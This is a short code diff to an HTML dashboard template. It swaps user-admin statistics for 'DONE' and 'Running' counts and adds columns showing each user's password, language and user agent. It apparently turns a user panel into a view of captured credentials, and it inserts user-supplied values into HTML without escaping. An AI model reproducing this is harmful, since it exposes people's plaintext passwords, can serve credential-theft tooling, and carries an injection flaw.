@@ -12,16 +12,12 @@ const body = `
             <div class="stat-number">${stats.total}</div>
         </div>
         <div class="stat-card">
-            <h3>Active Users</h3>
-            <div class="stat-number">${stats.active}</div>
+            <h3>DONE Users</h3>
+            <div class="stat-number">${stats.done}</div>
         </div>
         <div class="stat-card">
-            <h3>Inactive Users</h3>
-            <div class="stat-number">${stats.inactive}</div>
-        </div>
-        <div class="stat-card">
-            <h3>Administrators</h3>
-            <div class="stat-number">${stats.admins}</div>
+            <h3>Running Users</h3>
+            <div class="stat-number">${stats.running}</div>
         </div>
     </div>
     
@@ -31,19 +27,23 @@ const body = `
             <table>
                 <thead>
                     <tr>
-                        <th>Name</th>
+                        <th>UserId</th>
                         <th>Email</th>
+                        <th>Password</th>
                         <th>Status</th>
-                        <th>Role</th>
+                        <th>Language</th>
+                        <th>User Agent</th>
                     </tr>
                 </thead>
                 <tbody>
                     ${recentUsers.map(user => `
                         <tr>
-                            <td>${user.name}</td>
+                            <td>${user.userId}</td>
                             <td>${user.email}</td>
+                            <td>${user.pwd ?? ''}</td>
                             <td><span class="status-badge status-${user.status.toLowerCase()}">${user.status}</span></td>
-                            <td>${user.role}</td>
+                            <td>${user.lang}</td>
+                            <td>${user.userAgent}</td>
                         </tr>
                     `).join('')}
                 </tbody>
